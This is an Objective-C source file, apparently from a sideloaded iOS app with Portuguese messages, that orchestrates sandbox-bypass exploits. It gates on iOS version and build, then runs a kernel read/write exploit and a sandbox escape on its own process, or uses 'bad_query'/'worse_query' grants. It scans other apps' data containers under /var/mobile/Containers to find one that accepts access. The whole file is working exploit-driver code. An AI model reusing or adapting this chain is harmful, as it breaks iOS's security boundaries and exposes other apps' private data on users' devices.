

#import "FFSandbox.h"
#import "FFCore.h"

#import "Vendor/bad_query.h"
#import "Vendor/worse_query.h"
#import "Vendor/sandbox_escape.h"
#import "Vendor/kexploit_opa334.h"
#import "Vendor/kutils.h"
#import "FFPathleak.h"
#import "Vendor/mcm_bridge.h"

#import <errno.h>

#pragma mark - Policy (mirrors 3106 ExploitSupportPolicy)

static BOOL FFSupportsKernelExploit(int major, int minor, int patch, BOOL isA10) {
    if (minor < 0 || patch < 0) return NO;

    if (isA10 && major == 17) return NO;
    if (major == 17) return minor <= 7;
    if (major == 18) return minor < 7 || (minor == 7 && patch <= 1);
    return NO;
}

static BOOL FFSupportsBadQuery(int major, int minor, int patch) {
    if (major != 26 || minor < 0 || patch < 0) return NO;
    return minor < 6 || (minor == 6 && patch <= 1);
}

static NSArray<NSString *> *FFVerifiedIOS27Builds(void) {

    static NSArray<NSString *> *builds;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        builds = @[@"24C5037i"];
    });
    return builds;
}

static BOOL FFSupportsWorseQuery(int major, int minor, int patch, NSString *build) {
    if (minor < 0 || patch < 0) return NO;
    if (major == 26) return minor == 7 && patch <= 2;
    if (major == 27) {
        if (minor <= 2) return YES;
        if (minor == 3) {
            return patch == 0 && [FFVerifiedIOS27Builds() containsObject:build ?: @""];
        }
    }
    return NO;
}

static BOOL FFIsIOS18KernelPatched(int major, int minor, int patch) {
    if (major != 18) return NO;
    if (minor > 7) return YES;
    return minor == 7 && patch >= 2;
}

FFSandboxBackend FFSandboxCurrentBackend(void) {
    static FFSandboxBackend backend;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        int major = FFOSMajorNumber(), minor = FFOSMinorNumber(), patch = FFOSPatchNumber();
        if (FFSupportsKernelExploit(major, minor, patch, FFDeviceIsA10())) {
            backend = FFSandboxBackendKernel;
        } else if (FFSupportsWorseQuery(major, minor, patch, FFOSBuildString())) {
            backend = FFSandboxBackendWorseQuery;
        } else if (FFSupportsBadQuery(major, minor, patch)) {
            backend = FFSandboxBackendBadQuery;
        } else {
            backend = FFSandboxBackendUnsupported;
        }
        FFLog(@"sandbox: backend=%@ (iOS %@ build %@ model %@)",
              FFSandboxBackendName(backend),
              FFOSVersionString(), FFOSBuildString(), FFDeviceModelIdentifier());
    });
    return backend;
}

NSString *FFSandboxBackendName(FFSandboxBackend backend) {
    switch (backend) {
        case FFSandboxBackendKernel:     return @"kernel";
        case FFSandboxBackendBadQuery:   return @"bad_query";
        case FFSandboxBackendWorseQuery: return @"worse_query";
        default:                          return @"unsupported";
    }
}

NSString *FFSandboxBackendNameCurrent(void) {
    return FFSandboxBackendName(FFSandboxCurrentBackend());
}

BOOL FFSandboxOSIsSupported(void) {
    return FFSandboxCurrentBackend() != FFSandboxBackendUnsupported;
}

NSString *FFSandboxUnsupportedReason(void) {
    int major = FFOSMajorNumber(), minor = FFOSMinorNumber(), patch = FFOSPatchNumber();
    if (FFDeviceIsA10() && major == 17) {
        return @"A10 Fusion + iOS 17 não é suportado (a cadeia de kernel trava o aparelho).";
    }
    if (FFIsIOS18KernelPatched(major, minor, patch)) {
        return @"iOS 18.7.2+ tem o kernel exploit corrigido pela Apple (CVE-2025-43510/43520). "
               @"Nenhuma build futura deste projeto suporta essa versão.";
    }
    if (major == 27 && minor == 3) {
        return [NSString stringWithFormat:
            @"iOS 27.3 só é aceito na build %@ (beta 1). A partir do beta 2 a Apple corrigiu a técnica.",
            [FFVerifiedIOS27Builds() componentsJoinedByString:@", "]];
    }
    return [NSString stringWithFormat:
        @"Sistema não suportado: iOS %@ (build %@). Faixas verificadas: "
        @"17.0–17.7.x · 18.0–18.7.1 · 26.0–26.6.1 · 26.7–26.7.2 · 27.0–27.2 · 27.3 beta 1.",
        FFOSVersionString(), FFOSBuildString()];
}

#pragma mark - Serialisation

static NSRecursiveLock *FFSandboxOperationLock(void) {
    static NSRecursiveLock *lock;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        lock = [NSRecursiveLock new];
    });
    return lock;
}

#pragma mark - Grants

BOOL FFSandboxHostIsMobileHouseArrest(void) {
    static BOOL isMHA;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        isMHA = [[[NSBundle mainBundle] bundleIdentifier]
            isEqualToString:@"com.apple.mobile.MobileHouseArrest"];
        FFLog(@"sandbox: bundle id %@ (%@)", [NSBundle mainBundle].bundleIdentifier ?: @"?",
              isMHA ? @"MHA-C2 habilitado" : @"sem identidade MHA");
    });
    return isMHA;
}

NSString *FFSandboxAppGroup(void) {
    return worse_query_app_group();
}

static int64_t FFSandboxGrantPathLocked(NSString *clean, BOOL writable) {
    const char *raw = clean.fileSystemRepresentation;
    int64_t handle = -1;

    switch (FFSandboxCurrentBackend()) {
        case FFSandboxBackendKernel:

            return -1;
        case FFSandboxBackendBadQuery:
            return bad_query((char *)raw, true, NULL, false);
        case FFSandboxBackendWorseQuery: {
            handle = writable ? worse_query_grant_ex(raw, 1) : worse_query_grant(raw);

            if (handle == -5) {

                static NSDate *lastRepair;
                static BOOL repairedOnce;
                NSTimeInterval since = (lastRepair == nil) ? 1.0e18
                    : [[NSDate date] timeIntervalSinceDate:lastRepair];
                if (!repairedOnce || since >= 60.0) {
                    repairedOnce = YES;
                    lastRepair = [NSDate date];
                    FFLog(@"sandbox: -5 em %@ — reparando Caches (throttle 60s)", clean.lastPathComponent);
                    if (worse_query_reset_access_cache() || worse_query_recover()) {
                        handle = writable ? worse_query_grant_ex(raw, 1) : worse_query_grant(raw);
                    }
                }
            }
            return handle;
        }
        default:
            return -1;
    }
}

int64_t FFSandboxGrantPath(NSString *path, BOOL writable, int *errorCode) {
    if (path.length == 0) {
        if (errorCode) *errorCode = -1;
        return -1;
    }
    NSString *clean = path;
    while (clean.length > 1 && [clean hasSuffix:@"/"]) {
        clean = [clean substringToIndex:clean.length - 1];
    }

    NSRecursiveLock *operationLock = FFSandboxOperationLock();
    [operationLock lock];
    int64_t handle = -1;
    @try {
        handle = FFSandboxGrantPathLocked(clean, writable);
    } @finally {
        [operationLock unlock];
    }

    if (errorCode) *errorCode = (int)handle;
    if (handle < 0 && FFSandboxCurrentBackend() != FFSandboxBackendKernel) {
        FFLog(@"sandbox: grant refused path=%@ writable=%d code=%lld backend=%@",
              clean, (int)writable, handle, FFSandboxBackendNameCurrent());
    }
    return handle;
}

void FFSandboxReleaseHandle(int64_t handle) {
    if (handle < 0) return;
    NSRecursiveLock *operationLock = FFSandboxOperationLock();
    [operationLock lock];
    @try {
        switch (FFSandboxCurrentBackend()) {
            case FFSandboxBackendBadQuery:
                bad_query_release(handle);
                break;
            case FFSandboxBackendWorseQuery:
                worse_query_release(handle);
                break;
            default:
                break;
        }
    } @finally {
        [operationLock unlock];
    }
}

#pragma mark - Probe / activation

static NSLock *FFProbeLock(void) {
    static NSLock *lock;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        lock = [NSLock new];
    });
    return lock;
}

static BOOL FFSandboxProbeUncached(void) {
    switch (FFSandboxCurrentBackend()) {
        case FFSandboxBackendKernel:
            return sandbox_access_is_active() == 1;

        case FFSandboxBackendBadQuery: {

            if (FFSandboxHostIsMobileHouseArrest()) {
                NSString *mcmError = nil;
                NSString *ownContainer = MCMActivateContainerPath(
                    2, @"com.apple.mobile.MobileHouseArrest", NO, &mcmError);
                if (ownContainer.length > 0) {
                    int64_t handle = FFSandboxGrantPath(ownContainer, NO, NULL);
                    if (handle >= 0 || FFSandboxCurrentBackend() == FFSandboxBackendKernel) {
                        if (handle >= 0) FFSandboxReleaseHandle(handle);
                        FFLog(@"sandbox: bad_query ativo via MHA-C2 (%@)", ownContainer.lastPathComponent);
                        return YES;
                    }

                    if ([[NSFileManager defaultManager] fileExistsAtPath:ownContainer]) {
                        FFLog(@"sandbox: MHA-C2 lease ativo (%@)", mcmError ?: @"sem erro");
                        return YES;
                    }
                }
                FFLog(@"sandbox: MHA-C2 indisponível (%@)", mcmError ?: @"sem detalhe");
            }
            static NSString *cachedContainer;
            if (cachedContainer.length > 0) {
                int64_t handle = FFSandboxGrantPath(cachedContainer, NO, NULL);
                if (handle >= 0) {
                    FFSandboxReleaseHandle(handle);
                    return YES;
                }
                cachedContainer = nil;
            }

            NSArray<NSString *> *names = FFPathleakListNames(@"/var/mobile/Containers/Data/Application", 2000000);
            for (NSString *name in names) {
                if ([[NSUUID alloc] initWithUUIDString:name] == nil) continue;
                NSString *container = [@"/var/mobile/Containers/Data/Application"
                    stringByAppendingPathComponent:name];
                int64_t handle = FFSandboxGrantPath(container, NO, NULL);
                if (handle >= 0) {
                    FFSandboxReleaseHandle(handle);
                    cachedContainer = container;
                    FFLog(@"sandbox: bad_query aceitou container %@", name);
                    return YES;
                }
            }
            return NO;
        }

        case FFSandboxBackendWorseQuery: {
            NSString *group = worse_query_app_group();
            if (group.length == 0) {
                FFLog(@"sandbox: sem App Group — worse_query não roda");
                return NO;
            }
            NSString *groupPath = nil;
            NSURL *groupURL = [[NSFileManager defaultManager]
                containerURLForSecurityApplicationGroupIdentifier:group];
            if (groupURL.path.length) {
                groupPath = groupURL.path;
            } else {
                groupPath = [@"/var/mobile/Containers/Shared/AppGroup" stringByAppendingPathComponent:group];
            }

            int64_t handle = FFSandboxGrantPath(groupPath, YES, NULL);
            if (handle >= 0) {
                FFSandboxReleaseHandle(handle);
                return YES;
            }
            return NO;
        }

        default:
            return NO;
    }
}

static BOOL FFProbeCachedValue = NO;
static NSDate *FFProbeCachedAt = nil;
static BOOL FFProbeCachedValid = NO;
static BOOL FFKernelActivationAttempted = NO;

static NSLock *FFSandboxActivationLock(void) {
    static NSLock *lock;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        lock = [NSLock new];
    });
    return lock;
}

BOOL FFSandboxAccessActive(void) {
    [FFProbeLock() lock];
    if (FFProbeCachedValid && FFProbeCachedAt != nil &&
        [[NSDate date] timeIntervalSinceDate:FFProbeCachedAt] < 60.0) {
        BOOL cached = FFProbeCachedValue;
        [FFProbeLock() unlock];
        return cached;
    }
    [FFProbeLock() unlock];

    NSRecursiveLock *operationLock = FFSandboxOperationLock();
    [operationLock lock];
    BOOL value = NO;
    @try {

        [FFProbeLock() lock];
        BOOL stillCached = FFProbeCachedValid && FFProbeCachedAt != nil;
        if (stillCached) value = FFProbeCachedValue;
        [FFProbeLock() unlock];

        if (!stillCached) {
            value = FFSandboxProbeUncached();
            [FFProbeLock() lock];
            FFProbeCachedValue = value;
            FFProbeCachedAt = [NSDate date];
            FFProbeCachedValid = YES;
            [FFProbeLock() unlock];
            FFLog(@"sandbox: probe %@ (%@)", value ? @"OK" : @"FAILED", FFSandboxBackendNameCurrent());
        }
    } @finally {
        [operationLock unlock];
    }
    return value;
}

void FFSandboxWaitForActivation(void) {
    NSLock *activationLock = FFSandboxActivationLock();
    [activationLock lock];
    [activationLock unlock];

    NSRecursiveLock *operationLock = FFSandboxOperationLock();
    [operationLock lock];
    [operationLock unlock];
}

BOOL FFSandboxInvalidateCaches(void) {
    [FFProbeLock() lock];
    FFProbeCachedValid = NO;
    FFProbeCachedAt = nil;
    [FFProbeLock() unlock];

    NSRecursiveLock *operationLock = FFSandboxOperationLock();
    [operationLock lock];
    @try {
        if (FFSandboxCurrentBackend() == FFSandboxBackendWorseQuery) {
            worse_query_forget_all();
            worse_query_invalidate_caches();
        }
    } @finally {
        [operationLock unlock];
    }
    return YES;
}

static BOOL FFSandboxActivateLocked(NSString **detailOut) {
    if (!FFSandboxOSIsSupported()) {
        if (detailOut) *detailOut = FFSandboxUnsupportedReason();
        return NO;
    }

    FFSandboxBackend backend = FFSandboxCurrentBackend();
    FFLog(@"exploit: ===== %@ backend =====", FFSandboxBackendName(backend));

    if (backend == FFSandboxBackendKernel) {
        if (sandbox_access_is_active() == 1) {
            FFSandboxInvalidateCaches();
            if (detailOut) *detailOut = @"acesso já ativo";
            return YES;
        }
        if (FFKernelActivationAttempted) {
            if (detailOut) *detailOut = @"a ativação já foi tentada nesta sessão; nova tentativa bloqueada";
            FFLog(@"kexploit: repetição bloqueada nesta sessão");
            return NO;
        }

        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
        if ([defaults boolForKey:@"FFKernelChainRunning"]) {
            FFLog(@"kexploit: tentativa anterior interrompeu o app — cadeia automática bloqueada "
                  @"(Perfil → REATIVAR ACESSO para liberar)");
            if (detailOut) *detailOut = @"tentativa anterior de kernel interrompeu o app; "
                                        @"use REATIVAR ACESSO no Perfil";
            return NO;
        }

        BOOL looksJailbroken = [[NSFileManager defaultManager] fileExistsAtPath:@"/var/jb"] ||
                               [[NSFileManager defaultManager] fileExistsAtPath:@"/usr/lib/libsubstitute.dylib"] ||
                               [[NSFileManager defaultManager] fileExistsAtPath:@"/usr/lib/libhooker.dylib"] ||
                               [[NSFileManager defaultManager] fileExistsAtPath:@"/.installed_unc0ver"];
        if (looksJailbroken && sandbox_access_is_active() == 0) {
            if (detailOut) *detailOut = @"ambiente com jailbreak detectado — a cadeia de kernel "
                                        @"não roda com resultado confiável aqui.";
            FFLog(@"exploit: refused — jailbreak environment detected");
            return NO;
        }

        FFLog(@"kexploit: ===== STAGE 1/2: kernel r/w (kexploit_opa334) =====");
        FFKernelActivationAttempted = YES;
        [defaults setBool:YES forKey:@"FFKernelChainRunning"];
        [defaults synchronize];
        int kernelResult = kexploit_opa334();
        [defaults setBool:NO forKey:@"FFKernelChainRunning"];
        [defaults synchronize];
        if (kernelResult != 0) {
            if (detailOut) *detailOut = [NSString stringWithFormat:
                @"kernel exploit falhou (retorno %d). Build não suportada, offsets errados ou race perdida.",
                kernelResult];
            FFLog(@"kexploit: FAILED ret=%d", kernelResult);
            return NO;
        }
        FFLog(@"kexploit: OK — kernel r/w estabelecido");

        FFLog(@"kexploit: ===== STAGE 2/2: sandbox escape =====");
        uint64_t selfProcess = proc_self();
        if (selfProcess == 0) {
            if (detailOut) *detailOut = @"proc_self() retornou 0.";
            return NO;
        }
        int escapeResult = sandbox_escape(selfProcess);
        BOOL active = sandbox_access_is_active() == 1;
        FFLog(@"kexploit: sandbox_escape ret=%d probe=%d", escapeResult, (int)active);

        if (!active && escapeResult != 0) {
            if (detailOut) *detailOut = [NSString stringWithFormat:
                @"sandbox escape falhou (retorno %d).", escapeResult];
            return NO;
        }
        [defaults setBool:NO forKey:@"FFKernelChainRunning"];
        [defaults synchronize];
        FFSandboxInvalidateCaches();
        if (detailOut) *detailOut = active ? @"kernel + sandbox escape ativos"
                                           : @"kernel r/w ativo (limitado)";
        return YES;
    }

    if (backend == FFSandboxBackendWorseQuery) {
        if (worse_query_app_group().length == 0) {
            if (detailOut) *detailOut = @"sem App Group. Assine com AltStore/SideStore/Sideloadly "
                                        @"ou com um App ID explícito com a capability App Groups.";
            return NO;
        }

        if (!worse_query_recover()) {
            FFLog(@"exploit: recover de Caches falhou — resetando access cache");
            worse_query_reset_access_cache();
            if (!worse_query_recover()) {
                FFLog(@"exploit: Caches continua inconsistente após reset");
            }
        }
    }

    BOOL ok = FFSandboxProbeUncached();
    if (!ok && backend == FFSandboxBackendWorseQuery) {
        FFLog(@"exploit: probe recusou — resetando access cache e tentando uma vez");
        worse_query_reset_access_cache();
        worse_query_forget_all();
        ok = FFSandboxProbeUncached();
    }
    if (detailOut) *detailOut = ok ? [NSString stringWithFormat:@"%@ ativo", FFSandboxBackendName(backend)]
                                   : [NSString stringWithFormat:@"%@ recusou o probe", FFSandboxBackendName(backend)];
    if (ok) FFSandboxInvalidateCaches();
    return ok;
}

void FFSandboxClearKernelCrashGuard(void) {
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    [defaults setBool:NO forKey:@"FFKernelChainRunning"];
    [defaults synchronize];
    FFLog(@"kexploit: crash guard liberado manualmente");
}

BOOL FFSandboxActivate(NSString **detailOut) {
    NSLock *activationLock = FFSandboxActivationLock();
    [activationLock lock];
    BOOL ok = NO;
    @try {
        NSRecursiveLock *operationLock = FFSandboxOperationLock();
        [operationLock lock];
        @try {
            ok = FFSandboxActivateLocked(detailOut);
        } @finally {
            [operationLock unlock];
        }
    } @finally {
        [activationLock unlock];
    }
    return ok;
}

#pragma mark - Grant + body helper

BOOL FFSandboxPerformWithGrant(NSString *directory,
                               BOOL writable,
                               NSError *(^body)(void),
                               NSError **error) {
    NSRecursiveLock *operationLock = FFSandboxOperationLock();
    [operationLock lock];
    @try {
    int grantCode = 0;
    int64_t handle = FFSandboxGrantPath(directory, writable, &grantCode);
    BOOL granted = handle >= 0 || FFSandboxCurrentBackend() == FFSandboxBackendKernel;

    if (!granted) {
        if (error) {
            *error = FFMakeError(FFErrorNoSandboxAccess,
                                 @"sem permissão de sandbox em %@ (código %d, backend %@)",
                                 directory.lastPathComponent, grantCode,
                                 FFSandboxBackendNameCurrent());
        }
        return NO;
    }

    NSError *bodyError = body();
    if (handle >= 0) FFSandboxReleaseHandle(handle);

    if (bodyError == nil) return YES;

    BOOL retryable = [bodyError.domain isEqualToString:NSPOSIXErrorDomain] &&
                     (bodyError.code == EPERM || bodyError.code == EACCES);
    if (!retryable || FFSandboxCurrentBackend() != FFSandboxBackendWorseQuery) {
        if (error) *error = bodyError;
        return NO;
    }

    FFSandboxInvalidateCaches();
    handle = FFSandboxGrantPath(directory, writable, &grantCode);
    if (handle < 0) {
        if (error) {
            *error = FFMakeError(FFErrorNoSandboxAccess,
                                 @"re-concessão falhou em %@ (código %d)",
                                 directory.lastPathComponent, grantCode);
        }
        return NO;
    }
    NSError *retryError = body();
    FFSandboxReleaseHandle(handle);
    if (retryError == nil) return YES;
    if (error) *error = retryError;
    return NO;

    } @finally {
        [operationLock unlock];
    }
}
